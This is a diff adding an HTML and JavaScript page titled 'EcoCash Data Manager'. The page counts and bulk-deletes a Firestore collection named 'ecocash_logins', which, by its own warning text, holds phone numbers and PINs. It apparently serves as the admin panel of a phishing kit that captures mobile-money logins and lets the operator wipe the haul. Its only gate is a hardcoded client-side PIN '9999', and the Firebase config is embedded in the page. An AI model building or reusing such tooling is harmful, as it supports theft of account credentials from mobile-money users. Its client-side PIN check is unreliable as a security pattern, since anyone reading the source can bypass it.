@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash Data Manager</title>
+  
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    
+    .container {
+      max-width: 500px;
+      width: 100%;
+    }
+    
+    .card {
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      overflow: hidden;
+    }
+    
+    .card-header {
+      background: linear-gradient(135deg, #1c6aa6, #125c9c);
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+    
+    .card-header h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    
+    .card-header h1 span:first-child { color: #ffd700; }
+    .card-header h1 span:last-child { color: #ffffff; }
+    
+    .card-header p {
+      opacity: 0.9;
+      font-size: 16px;
+    }
+    
+    .card-body {
+      padding: 30px;
+    }
+    
+    .stats-box {
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 25px;
+      text-align: center;
+      border: 2px dashed #1c6aa6;
+    }
+    
+    .stats-number {
+      font-size: 48px;
+      font-weight: bold;
+      color: #1c6aa6;
+      line-height: 1.2;
+    }
+    
+    .stats-label {
+      color: #666;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .warning-box {
+      background: #fff3cd;
+      border: 2px solid #ffc107;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 25px;
+      color: #856404;
+    }
+    
+    .warning-box h3 {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+    
+    .warning-box p {
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 10px;
+    }
+    
+    .warning-box ul {
+      margin-left: 20px;
+      font-size: 14px;
+    }
+    
+    .pin-section {
+      margin-bottom: 25px;
+    }
+    
+    .pin-section label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: 600;
+      color: #333;
+    }
+    
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+    }
+    
+    .pin-input {
+      width: 60px;
+      height: 70px;
+      border: 2px solid #e0e0e0;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 32px;
+      font-weight: bold;
+      outline: none;
+      transition: all 0.3s;
+    }
+    
+    .pin-input:focus {
+      border-color: #1c6aa6;
+      box-shadow: 0 0 0 3px rgba(28,106,166,0.1);
+    }
+    
+    .pin-input.error {
+      border-color: #dc3545;
+      animation: shake 0.2s ease-in-out;
+    }
+    
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+    
+    .pin-message {
+      color: #dc3545;
+      font-size: 14px;
+      margin-top: 10px;
+      text-align: center;
+      min-height: 20px;
+    }
+    
+    .delete-btn {
+      width: 100%;
+      padding: 16px;
+      background: #dc3545;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+    
+    .delete-btn:hover:not(:disabled) {
+      background: #c82333;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(220,53,69,0.3);
+    }
+    
+    .delete-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    
+    .cancel-btn {
+      width: 100%;
+      padding: 12px;
+      background: #6c757d;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+      text-decoration: none;
+      display: inline-block;
+      text-align: center;
+    }
+    
+    .cancel-btn:hover {
+      background: #5a6268;
+    }
+    
+    .progress-container {
+      margin: 20px 0;
+      display: none;
+    }
+    
+    .progress-bar {
+      width: 100%;
+      height: 30px;
+      background: #f0f0f0;
+      border-radius: 15px;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #28a745, #20c997);
+      width: 0%;
+      transition: width 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    
+    .progress-text {
+      text-align: center;
+      margin-top: 10px;
+      color: #666;
+      font-size: 14px;
+    }
+    
+    .success-message {
+      background: #d4edda;
+      color: #155724;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      text-align: center;
+      display: none;
+    }
+    
+    .error-message {
+      background: #f8d7da;
+      color: #721c24;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      text-align: center;
+      display: none;
+    }
+    
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 20px;
+    }
+    
+    .footer-links a {
+      color: rgba(255,255,255,0.8);
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.3s;
+    }
+    
+    .footer-links a:hover {
+      color: white;
+    }
+    
+    @media (max-width: 480px) {
+      .card-header {
+        padding: 20px;
+      }
+      
+      .card-body {
+        padding: 20px;
+      }
+      
+      .pin-input {
+        width: 50px;
+        height: 60px;
+        font-size: 28px;
+      }
+      
+      .stats-number {
+        font-size: 36px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="card-header">
+        <h1>
+          <span>Eco</span><span>Cash</span>
+        </h1>
+        <p>Data Management Tool</p>
+      </div>
+      
+      <div class="card-body">
+        <!-- Stats Box -->
+        <div class="stats-box">
+          <div class="stats-number" id="totalCount">0</div>
+          <div class="stats-label">Total Entries in Database</div>
+        </div>
+        
+        <!-- Success Message -->
+        <div class="success-message" id="successMessage">
+          <strong>✅ Success!</strong> All data has been erased.
+        </div>
+        
+        <!-- Error Message -->
+        <div class="error-message" id="errorMessage">
+          <strong>❌ Error!</strong> <span id="errorText"></span>
+        </div>
+        
+        <!-- Warning Box -->
+        <div class="warning-box">
+          <h3>
+            <span>⚠️</span>
+            <span>Danger Zone</span>
+          </h3>
+          <p>You are about to permanently delete ALL entries from the database. This action:</p>
+          <ul>
+            <li>Cannot be undone</li>
+            <li>Will erase all phone numbers and PINs</li>
+            <li>Removes all historical data</li>
+          </ul>
+        </div>
+        
+        <!-- PIN Verification -->
+        <div class="pin-section">
+          <label>Enter security PIN to confirm deletion:</label>
+          <div class="pin-inputs" id="pinInputs">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin1">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin2">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin3">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin4">
+          </div>
+          <div class="pin-message" id="pinMessage"></div>
+        </div>
+        
+        <!-- Progress Bar -->
+        <div class="progress-container" id="progressContainer">
+          <div class="progress-bar">
+            <div class="progress-fill" id="progressFill">0%</div>
+          </div>
+          <div class="progress-text" id="progressText">Preparing to delete...</div>
+        </div>
+        
+        <!-- Action Buttons -->
+        <button class="delete-btn" id="deleteBtn" disabled>
+          <span>🗑️</span>
+          <span>Erase All Data</span>
+        </button>
+        
+        <a href="#" class="cancel-btn" onclick="window.location.href='admin.html'; return false;">
+          ← Cancel and Return
+        </a>
+      </div>
+    </div>
+    
+    <div class="footer-links">
+      <a href="admin.html">View Admin Panel</a>
+      <a href="#" onclick="location.reload(); return false;">Refresh Stats</a>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ==================== FIREBASE CONFIG ====================
+      const firebaseConfig = {
+        apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
+        authDomain: "eco-panel-3d06e.firebaseapp.com",
+        projectId: "eco-panel-3d06e",
+        storageBucket: "eco-panel-3d06e.firebasestorage.app",
+        messagingSenderId: "820242007704",
+        appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
+      };
+
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+      const COLLECTION_NAME = 'ecocash_logins';
+
+      // ==================== DOM ELEMENTS ====================
+      const pinInputs = [
+        document.getElementById('pin1'),
+        document.getElementById('pin2'),
+        document.getElementById('pin3'),
+        document.getElementById('pin4')
+      ];
+      const pinMessage = document.getElementById('pinMessage');
+      const deleteBtn = document.getElementById('deleteBtn');
+      const totalCountSpan = document.getElementById('totalCount');
+      const progressContainer = document.getElementById('progressContainer');
+      const progressFill = document.getElementById('progressFill');
+      const progressText = document.getElementById('progressText');
+      const successMessage = document.getElementById('successMessage');
+      const errorMessage = document.getElementById('errorMessage');
+      const errorText = document.getElementById('errorText');
+
+      // ==================== SECURITY PIN ====================
+      const CORRECT_PIN = '9999';
+      let isPinValid = false;
+
+      // ==================== PIN AUTO-ADVANCE ====================
+      function focusNext(currentIndex) {
+        if (currentIndex < pinInputs.length - 1) {
+          pinInputs[currentIndex + 1].focus();
+        }
+      }
+
+      function focusPrev(currentIndex) {
+        if (currentIndex > 0) {
+          pinInputs[currentIndex - 1].focus();
+        }
+      }
+
+      pinInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+          this.value = this.value.replace(/\D/g, '');
+          if (this.value.length === 1) {
+            focusNext(index);
+          }
+          validatePinInput();
+        });
+
+        input.addEventListener('keydown', function(e) {
+          if (e.key === 'Backspace') {
+            if (this.value.length === 0) {
+              e.preventDefault();
+              focusPrev(index);
+            }
+          } else if (e.key === 'ArrowLeft') {
+            e.preventDefault();
+            focusPrev(index);
+          } else if (e.key === 'ArrowRight') {
+            e.preventDefault();
+            focusNext(index);
+          } else {
+            if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
+              e.preventDefault();
+            }
+          }
+        });
+
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+          if (pasted.length > 0) {
+            this.value = pasted[0];
+            focusNext(index);
+            validatePinInput();
+          }
+        });
+      });
+
+      function validatePinInput() {
+        const enteredPIN = pinInputs.map(input => input.value).join('');
+        
+        if (enteredPIN.length < 4) {
+          pinMessage.textContent = '';
+          pinInputs.forEach(input => input.classList.remove('error'));
+          isPinValid = false;
+          deleteBtn.disabled = true;
+        } else if (enteredPIN === CORRECT_PIN) {
+          pinMessage.textContent = '✅ PIN correct. Delete button enabled.';
+          pinMessage.style.color = '#28a745';
+          pinInputs.forEach(input => input.classList.remove('error'));
+          isPinValid = true;
+          deleteBtn.disabled = false;
+        } else {
+          pinMessage.textContent = '❌ Incorrect PIN';
+          pinMessage.style.color = '#dc3545';
+          pinInputs.forEach(input => input.classList.add('error'));
+          isPinValid = false;
+          deleteBtn.disabled = true;
+        }
+      }
+
+      // ==================== FETCH COUNT ====================
+      function fetchCount() {
+        db.collection(COLLECTION_NAME).get()
+          .then((querySnapshot) => {
+            totalCountSpan.textContent = querySnapshot.size;
+          })
+          .catch((error) => {
+            console.error('Error fetching count:', error);
+            totalCountSpan.textContent = '?';
+          });
+      }
+
+      // ==================== DELETE ALL DATA ====================
+      async function deleteAllData() {
+        if (!isPinValid) {
+          showError('Please enter correct PIN');
+          return;
+        }
+
+        // Double confirm
+        if (!confirm('⚠️ ARE YOU ABSOLUTELY SURE?\n\nThis will permanently delete ALL entries. This cannot be undone!')) {
+          return;
+        }
+
+        // Hide any previous messages
+        successMessage.style.display = 'none';
+        errorMessage.style.display = 'none';
+        
+        // Show progress
+        progressContainer.style.display = 'block';
+        deleteBtn.disabled = true;
+        pinInputs.forEach(input => input.disabled = true);
+
+        try {
+          // Get all documents
+          const snapshot = await db.collection(COLLECTION_NAME).get();
+          const total = snapshot.size;
+          
+          if (total === 0) {
+            progressContainer.style.display = 'none';
+            showSuccess('No data to delete. Database is already empty.');
+            return;
+          }
+
+          progressFill.style.width = '0%';
+          progressFill.textContent = '0%';
+          progressText.textContent = `Deleting 0 of ${total} entries...`;
+
+          // Delete in batches of 500 (Firestore limit)
+          const batchSize = 500;
+          const batches = Math.ceil(total / batchSize);
+          let deleted = 0;
+
+          for (let i = 0; i < batches; i++) {
+            const start = i * batchSize;
+            const end = Math.min(start + batchSize, total);
+            
+            // Get batch of documents
+            const batchSnapshot = await db.collection(COLLECTION_NAME)
+              .orderBy('__name__')
+              .startAt(snapshot.docs[start])
+          .limit(batchSize)
+              .get();
+
+            // Delete in a transaction
+            const batch = db.batch();
+            batchSnapshot.docs.forEach(doc => {
+              batch.delete(doc.ref);
+            });
+            
+            await batch.commit();
+            
+            deleted += batchSnapshot.size;
+            const percent = Math.round((deleted / total) * 100);
+            
+            // Update progress
+            progressFill.style.width = percent + '%';
+            progressFill.textContent = percent + '%';
+            progressText.textContent = `Deleting ${deleted} of ${total} entries...`;
+          }
+
+          // Success!
+          progressFill.style.width = '100%';
+          progressFill.textContent = '100%';
+          progressText.textContent = `✅ Successfully deleted ${deleted} entries!`;
+          
+          setTimeout(() => {
+            progressContainer.style.display = 'none';
+            showSuccess(`Successfully deleted ${deleted} entries from database.`);
+            totalCountSpan.textContent = '0';
+            
+            // Reset PIN inputs
+            pinInputs.forEach(input => {
+              input.value = '';
+              input.disabled = false;
+            });
+            pinInputs[0].focus();
+            deleteBtn.disabled = true;
+            isPinValid = false;
+          }, 1500);
+
+        } catch (error) {
+          console.error('Delete error:', error);
+          progressContainer.style.display = 'none';
+          showError('Failed to delete data: ' + error.message);
+          
+          // Re-enable inputs
+          pinInputs.forEach(input => input.disabled = false);
+          deleteBtn.disabled = false;
+        }
+      }
+
+      function showSuccess(message) {
+        successMessage.style.display = 'block';
+        errorMessage.style.display = 'none';
+        setTimeout(() => {
+          successMessage.style.display = 'none';
+        }, 5000);
+      }
+
+      function showError(message) {
+        errorText.textContent = message;
+        errorMessage.style.display = 'block';
+        successMessage.style.display = 'none';
+        setTimeout(() => {
+          errorMessage.style.display = 'none';
+        }, 5000);
+      }
+
+      // ==================== EVENT LISTENERS ====================
+      deleteBtn.addEventListener('click', deleteAllData);
+
+      // Focus first PIN input
+      pinInputs[0].focus();
+
+      // Initial count
+      fetchCount();
+
+      // Refresh count every 5 seconds
+      setInterval(fetchCount, 5000);
+
+      // Clear PINs when clicking cancel
+      document.querySelector('.cancel-btn').addEventListener('click', function() {
+        pinInputs.forEach(input => input.value = '');
+      });
+
+    })();
+  </script>
+</body>
+</html>
